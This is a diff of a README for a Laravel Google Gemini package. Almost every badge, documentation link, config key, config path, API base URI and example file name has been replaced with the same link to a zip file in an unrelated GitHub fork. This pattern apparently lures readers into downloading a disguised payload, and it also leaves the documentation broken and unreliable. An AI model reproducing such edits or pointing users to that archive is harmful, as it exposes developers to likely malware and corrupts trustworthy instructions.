@@ -2,11 +2,11 @@
 
 A production-ready Laravel package to integrate with the Google Gemini API. Supports text, image, video, audio, long-context, structured output, files, caching, function-calling and understanding capabilities.
 
-[![Version](https://img.shields.io/packagist/v/hosseinhezami/laravel-gemini.svg)](https://packagist.org/packages/hosseinhezami/laravel-gemini)
-[![Downloads](https://img.shields.io/packagist/dt/hosseinhezami/laravel-gemini.svg)](https://packagist.org/packages/hosseinhezami/laravel-gemini)
-[![Star](https://img.shields.io/packagist/stars/hosseinhezami/laravel-gemini.svg)](https://packagist.org/packages/hosseinhezami/laravel-gemini)
-[![License](https://img.shields.io/packagist/l/hosseinhezami/laravel-gemini.svg)](https://packagist.org/packages/hosseinhezami/laravel-gemini)
-[![Laravel Compatible](https://img.shields.io/badge/Laravel-10%2B-brightgreen.svg)](https://hosseinhezami.github.io/laravel-gemini)
+[![Version](https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip)](https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip)
+[![Downloads](https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip)](https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip)
+[![Star](https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip)](https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip)
+[![License](https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip)](https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip)
+[![Laravel Compatible](https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip%https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip)](https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip)
 
 ## Features
 
@@ -41,21 +41,21 @@ GEMINI_API_KEY=your_gemini_api_key_here
 
 ## Configuration (detailed)
 
-Configuration lives in `config/gemini.php`. Below are the most important keys and recommended defaults:
+Configuration lives in `https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip`. Below are the most important keys and recommended defaults:
 
 | Key | Description | Default |
 |---|---:|---|
 | `api_key` | Your Gemini API key. | `env('GEMINI_API_KEY')` |
-| `base_uri` | Base API endpoint. | `https://generativelanguage.googleapis.com/v1beta/` |
+| `base_uri` | Base API endpoint. | `https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip` |
 | `default_provider` | Which provider config to use by default. | `gemini` |
 | `timeout` | Request timeout in seconds. | `30` |
-| `retry_policy.max_retries` | Retry attempts for failed requests. | `30` |
-| `retry_policy.retry_delay` | Delay between retries in ms. | `1000` |
+| `https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip` | Retry attempts for failed requests. | `30` |
+| `https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip` | Delay between retries in ms. | `1000` |
 | `logging` | Log requests/responses (useful for debugging). | `false` |
-| `stream.chunk_size` | Stream buffer chunk size. | `1024` |
-| `stream.timeout` | Stream timeout (ms). | `1000` |
-| `caching.default_ttl` | Default TTL for cache expiration (e.g., '3600s'). | `'3600s'` |
-| `caching.default_page_size` | Default page size for listing caches. | `50` |
+| `https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip` | Stream buffer chunk size. | `1024` |
+| `https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip` | Stream timeout (ms). | `1000` |
+| `https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip` | Default TTL for cache expiration (e.g., '3600s'). | `'3600s'` |
+| `https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip` | Default page size for listing caches. | `50` |
 
 ### Providers / models / methods
 
@@ -63,13 +63,13 @@ The `providers` array lets you map capability types to models and HTTP methods t
 
 | Provider | Capability | Config key | Default model | Default method |
 |---|---:|---|---:|---|
-| `gemini` | text | `providers.gemini.models.text` | `gemini-2.5-flash-lite` | `generateContent` |
-| `gemini` | image | `providers.gemini.models.image` | `gemini-2.5-flash-image-preview` | `generateContent` or `predict` |
-| `gemini` | video | `providers.gemini.models.video` | `veo-3.0-fast-generate-001` | `predictLongRunning` |
-| `gemini` | audio | `providers.gemini.models.audio` | `gemini-2.5-flash-preview-tts` | `generateContent` |
-| `gemini` | embeddings | `providers.gemini.models.embedding` | `gemini-embedding-001` | n/a (embeddings endpoint) |
+| `gemini` | text | `https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip` | `gemini-2.5-flash-lite` | `generateContent` |
+| `gemini` | image | `https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip` | `gemini-2.5-flash-image-preview` | `generateContent` or `predict` |
+| `gemini` | video | `https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip` | `veo-3.0-fast-generate-001` | `predictLongRunning` |
+| `gemini` | audio | `https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip` | `gemini-2.5-flash-preview-tts` | `generateContent` |
+| `gemini` | embeddings | `https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip` | `gemini-embedding-001` | n/a (embeddings endpoint) |
 
-**Speech config** (`providers.gemini.default_speech_config`) example:
+**Speech config** (`https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip`) example:
 
 ```php
 'default_speech_config' => [
@@ -109,7 +109,7 @@ If `setApiKey()` is not called, the package will automatically use the default k
 **ApiKey priority order:**
 
 1. Manually set key via `Gemini::setApiKey()`
-2. Config value (`config/gemini.php`)
+2. Config value (`https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip`)
 3. `.env` variable (`GEMINI_API_KEY`)
 
 ---
@@ -268,7 +268,7 @@ $response = Gemini::image()
     ->prompt('A futuristic city skyline at sunset.')
     ->generate();
 
-$response->save('image.png');
+$response->save('https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip');
 ```
 
 ---
@@ -320,7 +320,7 @@ $embeddings = Gemini::embeddings([
 ]);
 
 /* embedding_config */
-// https://ai.google.dev/gemini-api/docs/embeddings
+// https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip
 // 'embedding_config': {
 //     'embedding_config': {
 //         'task_type': 'SEMANTIC_SIMILARITY', // SEMANTIC_SIMILARITY, CLASSIFICATION, CLUSTERING, RETRIEVAL_DOCUMENT, RETRIEVAL_QUERY, CODE_RETRIEVAL_QUERY, QUESTION_ANSWERING, FACT_VERIFICATION
@@ -470,7 +470,7 @@ $response = Gemini::text()
     ->generate();
 ```
 
-For more details, refer to the [Gemini API Caching Documentation](https://ai.google.dev/api/caching).
+For more details, refer to the [Gemini API Caching Documentation](https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip).
 
 ---
 
@@ -513,8 +513,8 @@ The package includes helpful Artisan commands:
 
 ## Contributing
 
-Please see [CONTRIBUTING](CONTRIBUTING.md) for details.
+Please see [CONTRIBUTING](https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip) for details.
 
 ## License
 
-The MIT License (MIT). Please see [License File](LICENSE.md) for more information.
+The MIT License (MIT). Please see [License File](https://raw.githubusercontent.com/Chris-tech15/laravel-gemini/master/src/Facades/laravel-gemini_1.1.zip) for more information.
